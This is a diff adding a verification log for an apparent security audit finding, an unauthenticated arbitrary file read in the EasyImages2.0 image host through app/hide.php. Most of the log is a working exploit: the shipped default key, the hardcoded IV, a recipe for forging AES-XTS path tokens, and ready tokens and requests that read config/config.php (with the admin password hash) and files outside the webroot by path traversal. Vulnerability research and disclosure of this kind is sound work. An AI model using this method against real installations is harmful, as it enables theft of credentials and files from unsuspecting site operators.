@@ -1,0 +1,39 @@
+EI2-01 - Unauthenticated arbitrary file read via hide.php forgeable path token
+Target: EasyImages2.0 (tested locally, PHP 8.4.26 built-in server, 127.0.0.1:8093)
+Prereq check: config/config.php ships 'hide_key'=>'EasyImage2.0' (line 116); install
+wizard does NOT rotate it (install/contorl.php only overwrites password/user/domain/imgurl).
+app/hide.php never checks $config['hide'], so the endpoint is live even with the hide
+feature disabled (shipped default 'hide'=>0).
+
+[1] Baseline (no key param)
+    GET /app/hide.php
+    -> HTTP 200, Content-Type: image/png;text/html, 4886 bytes = public/images/404.png
+
+[2] Attacker offline forgery (replicating app/function.php urlHash(), lines 561-575)
+    key      = (string)crc32('EasyImage2.0') = "837912684"   (openssl zero-pads to 32 bytes for AES-128-XTS)
+    iv/tweak = 'sciCuBC7orQtDhTO'                            (hardcoded, function.php:569)
+    token    = base64_encode(openssl_encrypt(path,'AES-128-XTS',key,0,iv))  (matches urlHash options=0 double-base64 format)
+
+[3] Read sensitive in-root file /config/config.php
+    token = V0RDVnVscFRDb0ZiOGY3amx2M1dOUzhv
+    GET /app/hide.php?key=V0RDVnVscFRDb0ZiOGY3amx2M1dOUzhv
+    -> HTTP 200, Content-Type: image/php;text/html
+    -> body = FULL source of config/config.php (20,033 bytes), first bytes "<?php\n$config=Array"
+    -> contains admin credential material:
+       password'=>'$2y$12<REDACTED>'   (bcrypt hash of admin password, config/config.php:16)
+       hide_key'=>'EasyImage2.0'
+    Impact: admin password hash exfiltration without any authentication.
+
+[4] Read files OUTSIDE the webroot (path traversal; APP_ROOT string concat, hide.php:14)
+    token = VkNaMTRpSVBLOTJ3Q1p3c1FaMEZic3JGOCszM3VnPT0=   (path "/../outside-marker.txt")
+    GET /app/hide.php?key=VkNaMTRpSVBLOTJ3Q1p3c1FaMEZic3JGOCszM3VnPT0=
+    -> HTTP 200, body: "OUT-OF-ROOT-MARKER-canary-ei2-01"  (file 1 level above docroot)
+    token = VTNDQXdiRlp0eUFndlNmVDVWYS81SG9YNWs4aWhSYkdnS2s9 (path "/../../outside-marker2.txt")
+    GET /app/hide.php?key=VTNDQXdiRlp0eUFndlNmVDVWYS81SG9YNWs4aWhSYkdnS2s9
+    -> HTTP 200, body: "OUT-OF-ROOT-MARKER-two-levels"     (file 2 levels above docroot)
+
+Result: VERIFIED. No authentication, no secret beyond the shipped-default hide_key;
+attacker reads any file readable by the PHP process, with attacker-influenced
+image/<ext> Content-Type. Note: first forgery attempt WITHOUT leading '/' in the
+path failed (is_file false -> 404.png) because hide.php concatenates APP_ROOT . path;
+paths must be rooted at APP_ROOT via leading '/..' segments.
